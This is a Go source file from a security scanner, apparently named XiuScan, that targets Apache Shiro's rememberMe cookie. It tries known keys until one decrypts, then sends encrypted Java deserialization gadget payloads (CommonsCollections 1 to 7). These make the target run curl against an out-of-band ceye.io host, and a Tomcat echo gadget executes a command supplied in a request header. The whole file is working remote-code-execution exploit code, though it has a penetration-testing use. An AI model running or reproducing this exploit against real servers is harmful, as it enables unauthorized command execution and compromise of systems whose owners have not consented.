package shiro

import (
	"encoding/hex"
	gososerial "github.com/EmYiQing/Gososerial"
	"github.com/EmYiQing/Gososerial/ysoserial/gadget"
	"github.com/EmYiQing/XiuScan/core/ceye"
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"strconv"
	"strings"
	"time"
)

func Scan(target string, ceyeInfo *ceye.Ceye) {
	log.Info("check shiro key")
	key := CheckShiroKey(target)
	log.Info("find shiro key: %s", key)
	if ceyeInfo.Url != "" {
		log.Info("use ceye.io: %s", ceyeInfo.Identifier)

		randStr := tool.GetRandomLetter(20)
		payload := gososerial.GetCC1("curl " + ceyeInfo.Identifier + "/" + randStr)
		log.Info("check %s", gadget.CC1)
		SendPayload(key, payload, target)
		if checkCeyeResp(ceyeInfo, randStr) {
			log.Info("payload %s success", gadget.CC1)
		}

		randStr = tool.GetRandomLetter(20)
		payload = gososerial.GetCC2("curl " + ceyeInfo.Identifier + "/" + randStr)
		log.Info("check %s", gadget.CC2)
		SendPayload(key, payload, target)
		if checkCeyeResp(ceyeInfo, randStr) {
			log.Info("payload %s success", gadget.CC2)
		}

		randStr = tool.GetRandomLetter(20)
		payload = gososerial.GetCC3("curl " + ceyeInfo.Identifier + "/" + randStr)
		log.Info("check %s", gadget.CC3)
		SendPayload(key, payload, target)
		if checkCeyeResp(ceyeInfo, randStr) {
			log.Info("payload %s success", gadget.CC3)
		}

		randStr = tool.GetRandomLetter(20)
		payload = gososerial.GetCC4("curl " + ceyeInfo.Identifier + "/" + randStr)
		log.Info("check %s", gadget.CC4)
		SendPayload(key, payload, target)
		if checkCeyeResp(ceyeInfo, randStr) {
			log.Info("payload %s success", gadget.CC4)
		}

		randStr = tool.GetRandomLetter(20)
		payload = gososerial.GetCC5("curl " + ceyeInfo.Identifier + "/" + randStr)
		log.Info("check %s", gadget.CC5)
		SendPayload(key, payload, target)
		if checkCeyeResp(ceyeInfo, randStr) {
			log.Info("payload %s success", gadget.CC5)
		}

		randStr = tool.GetRandomLetter(20)
		payload = gososerial.GetCC6("curl " + ceyeInfo.Identifier + "/" + randStr)
		log.Info("check %s", gadget.CC6)
		SendPayload(key, payload, target)
		if checkCeyeResp(ceyeInfo, randStr) {
			log.Info("payload %s success", gadget.CC6)
		}

		randStr = tool.GetRandomLetter(20)
		payload = gososerial.GetCC7("curl " + ceyeInfo.Identifier + "/" + randStr)
		log.Info("check %s", gadget.CC7)
		SendPayload(key, payload, target)
		if checkCeyeResp(ceyeInfo, randStr) {
			log.Info("payload %s success", gadget.CC7)
		}
	}
	log.Info("check tomcat echo")
	K1, _ := hex.DecodeString(CCK1TomcatEchoHex)
	K2, _ := hex.DecodeString(CCK2TomcatEchoHex)
	S1 := CheckTomcatEcho(key, K1, target)
	S2 := CheckTomcatEcho(key, K2, target)
	if S1 {
		log.Info("CommonsCollectionsK1 TomcatEcho success")
	}
	if S2 {
		log.Info("CommonsCollectionsK1 TomcatEcho success")
	}
}

func checkCeyeResp(ceyeInfo *ceye.Ceye, randStr string) bool {
	time.Sleep(time.Second * 3)
	ceyeInfo.ChangeFilter(randStr)
	resp := http.Get(ceyeInfo.Url)
	if strings.Contains(string(resp.Body), randStr) {
		return true
	}
	return false
}

func CheckShiroKey(target string) string {
	var key string
	for _, v := range keys {
		temp, _ := hex.DecodeString(simplePrincipalCollectionHex)
		data := EncodeCBCShiro(v, temp)
		headers := make(map[string]string)
		headers["Cookie"] = rememberMe + data
		req := &http.Request{
			Url:     http.NewUrl(target),
			Method:  "GET",
			Headers: headers,
		}
		resp := http.DoRequest(req)
		if !http.ContainsCookie(resp, deleteMe) {
			headers["Cookie"] = rememberMe + data + errorCookie
			newReq := &http.Request{
				Url:     http.NewUrl(target),
				Method:  "GET",
				Headers: headers,
			}
			newResp := http.DoRequest(newReq)
			if http.ContainsCookie(newResp, deleteMe) {
				key = v
			}
		}
	}
	return key
}

func SendPayload(key string, payload []byte, target string) {
	data := EncodeCBCShiro(key, payload)
	headers := make(map[string]string)
	headers["Cookie"] = rememberMe + data
	req := &http.Request{
		Url:     http.NewUrl(target),
		Method:  "GET",
		Headers: headers,
	}
	http.DoRequest(req)
}

func CheckTomcatEcho(key string, payload []byte, target string) bool {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ '*' __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	data := EncodeCBCShiro(key, payload)
	headers := make(map[string]string)
	headers["Testecho"] = "xiuscan"
	headers["Testcmd"] = cmd
	headers["Cookie"] = rememberMe + data
	req := &http.Request{
		Url:     http.NewUrl(target),
		Method:  "GET",
		Headers: headers,
	}
	resp := http.DoRequest(req)
	if resp.Headers["Testecho"] == "xiuscan" {
		if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
			return true
		}
	}
	return false
}
